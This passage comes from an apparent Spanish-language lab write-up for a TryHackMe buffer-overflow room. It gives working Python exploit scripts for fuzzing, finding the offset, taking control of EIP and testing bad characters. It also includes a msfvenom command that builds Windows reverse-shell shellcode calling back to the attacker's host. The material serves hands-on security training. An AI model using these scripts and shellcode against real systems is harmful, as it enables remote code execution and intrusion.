<span class="n">offset</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">2003</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xaf\x11\x50\x62</span><span class="s">"</span> <span class="o">+</span> <span class="s">"\90"</span><span class="o">*</span><span class="mi">32</span> <span class="o">+</span> <span class="n">overflow</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'&lt;WinIP&gt;'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">((</span><span class="s">'TRUN /.:/'</span> <span class="o">+</span> <span class="n">offset</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">except</span><span class="p">:</span>
<span class="k">print</span> <span class="s">"Error connecting to server"</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>Observemos que entre el overflow y el valor del EIP hemos añadido “trash” para garantizar un correcto funcionamiento del código.</p>

<p>Seguidamente, levantamos un listener de netcat en el puerto adecuado y lanzamos el script obteniendo:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024131500.png" text-align="center" />
</div>

<p><br /></p>

<h3 id="3-python3">3. Python3.</h3>

<p>Dado el hecho de que Python2 está obsoleto y superado por Python3, vamos a repetir las partes más esenciales del curso con Python3.</p>

<p>El script de envío de datos queda como sigue:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">100</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="k">try</span><span class="p">:</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'&lt;WinIP&gt;'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"TRUN /.:/"</span> <span class="o">+</span> <span class="nb">buffer</span>

<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">((</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">()))</span>
<span class="n">s</span><span class="p">.</span><span class="n">close</span>
<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100</span>

<span class="k">except</span><span class="p">:</span>

<span class="k">print</span> <span class="p">(</span><span class="s">"Fuzzing crashed at %s bytes"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)))</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p><br /></p>

<h3 id="4-tryhackmes-buffer-overflow">4. Tryhackme’s Buffer Overflow.</h3>

<h4 id="41-buffer-overflow-prep">4.1. Buffer Overflow Prep.</h4>

<p>Este ‘room’ usa un Windows de 32 bits con Immunity Debugger preinstalado. Nos conectamos a la máquina mediante el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:admin /p:password /cert:ignore /v:10.10.216.16 /workarea
</code></pre></div></div>

<p>Una vez en el escritorio tenemos una carpeta “vulnearble-apps &gt; oscp”</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024185954.png" text-align="center" />
</div>

<p>Abrimos el Immunity Debugger como administradores y el ejecutable oscp y ligamos el ejecutable a Immunity Debugger como hemos hecho en el tutorial anterior y lo iniciamos:</p>

<p>Seguidamente, utilizamos netcat para conectarnos al servicio:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024191636.png" text-align="center" />
</div>

<p><br /></p>

<p>**OVERFLOW 1. Scripting for Pentesters..md</p>

<ul>
  <li>En primer lugar, configuramos un directorio de trabajo con Mona (recordamos, el comando de python embebido en Immunity Debugger):</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!</span>mona config <span class="nt">-set</span> workingfolder c:<span class="se">\m</span>ona<span class="se">\%</span>p
</code></pre></div></div>

<p><br /></p>

<ul>
  <li><em>Fuzzing</em>: En este caso, por el enunciado sabemos que el comando “OVERFLOW1” es vulnerable, así pasámos a la etapa de Fuzzing que, recordemos, se trata de una etapa en la que averiguamos el número de bytes con el crashea el servicio.</li>
</ul>

<p>Creamos un fichero python en nuestra máquina Kali atacante con el siguiente código:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">sys</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.216.16"</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
<span class="n">timeout</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW1 "</span>

<span class="n">string</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">100</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="k">try</span><span class="p">:</span>
<span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Fuzzing with {} bytes"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Fuzzing crashed at {} bytes"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">)))</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">string</span> <span class="o">+=</span> <span class="mi">100</span> <span class="o">*</span> <span class="s">"A"</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<p>Observemos que este código, en bucle, inicia una conexión con el servicio, le manda el comando acompañado de datos que van incrementando en cada iteración. Observamos que, tras la ejecución, el servicio crashea cerca de los 2000 bytes y el EIP está sobreescrito luego el crasheo se debe al desbordamiento del buffer:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024195726.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Crash Replication &amp; Controlling EIP</em>: Ahora, vamos a desarrollar el fichero cuyo código será el exploit que utilizaremos. Empleamos el siguiente codigo Python:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.216.16"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW1 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p>Conforme vayamos completando pasos irémos variando el código anterior hasta que sea el definitivo que nos abra una reverse shell.</p>

<p>En primer lugar, para tomar el control del EIP necesitamos saber el offset (el byte a partir del comienzo de los datos) respecto del cual comienza el valor que luego terminará en el registro EIP. Para ello vamos a emplear la herramienta del entorno C2 Metasploit, <em>pattern_create</em>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> 2100
</code></pre></div></div>

<p>Copiamos el output y lo lanzamos con el código anterior:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.216.16"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW1 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9"</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p>Y lo lanzamos. Lo que obtenemos en el Immunity Debugger es el correspondiente crash del servicio y el patrón con el que se ha sobreescrito el EIP:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024201819.png" text-align="center" />
</div>

<p>Ahora, utilizamos Mona en el Immunity Debugger para saber cuál es el offset asociado al EIP:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024202102.png" text-align="center" />
</div>

<p>Obvservamos que se encuentra en el offset 1978 y esto se puede corroborar con el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="nt">-l</span> 2100 <span class="nt">-q</span> 6f43396e
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024202310.png" text-align="center" />
</div>

<p>Para demostrar esto, empleamos el siguiente código:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.216.16"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW1 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">1978</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">4</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p>Al lanzarlo, obtenemos que el EIP ha sido sobreescrito con cuatro ‘42’, con lo que efectivamente, hemos tomado control del valor del registro del EIP:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024202759.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Finding Bad Characters and generating ShellCode</em>:</li>
</ul>

<p>A continuación vamos a intentar encontrar “bad characters” para excluirlos de la generación del shell code.</p>

<p>Empleamos el siguiente código en Python para generar caracteres hexadecimales:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x"</span> <span class="o">+</span> <span class="s">"{:02x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
<span class="k">print</span><span class="p">()</span>
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>El output del comando “*python3 badchars.py</td>
      <td>tr -d ‘\n’; echo*” lo introducimos en el código exploit.py</td>
    </tr>
  </tbody>
</table>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.216.16"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW1 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">1978</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">4</span>
<span class="n">postfix</span> <span class="o">=</span><span class="s">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p>Y lo enviamos al programa. Una vez enviado, examinamos el Hexdump después del valor del registro del EIP, el ESP:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221025103342.png" text-align="center" />
</div>

<p>Podemos observar en la imagen que los bytes \x07, \x08, \x2E, \x2F, \xA0, \xA1. <em>Esto no significa que todos estos bytes sean de hecho “badcharacters”, algunos badcharacters hacen que el byte siguiente se corrompa pero para evitar problemas descartaremos todos ellos</em>.</p>

<p>De esta forma, el comando a utilizar para generar el shellcode sería el siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;YOUR_IP&gt; <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00,</span><span class="se">\x</span><span class="s2">07,</span><span class="se">\x</span><span class="s2">08,</span><span class="se">\x</span><span class="s2">2E,</span><span class="se">\x</span><span class="s2">2F,</span><span class="se">\x</span><span class="s2">A0,</span><span class="se">\x</span><span class="s2">A1"</span> <span class="nt">-f</span> c
</code></pre></div></div>

<p>Este nos devolverá un output que debemos colocar en la variable Payload de nuestro exploit.py.</p>

<p><br /></p>

<ul>
  <li><em>Finding a Jump Point</em>:</li>
</ul>

<p>Ahora, todo lo que queda es encontrar un punto de salto, es decir, una instrucción que incluya una librería en la que incluir nuestro código malicioso. Para ello empleamos el siguiente comando en Immunity Debugger: <em>!mona jmp -r esp -cpb “\x00\x07\x08\x2E\x2F\xA0\xA1”</em></p>

<p>Este identificará todas las instrucciones jmp esp y nos devolverá los punteros que apuntan a la dirección de memoria sobre la que se produce el salto al ESP.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221025114207.png" text-align="center" />
</div>

<p>Podemos observar que todas las direcciones están sin protección de memoria y apuntan a una libreria llamada essfunc.dll. De esta forma, acudimos a nuestro exploit.py seteamos la variable ‘retn’ con una de las direcciones colocada con los bytes alrevés. En nuestro caso, la dirección escogida es 625011af:</p>

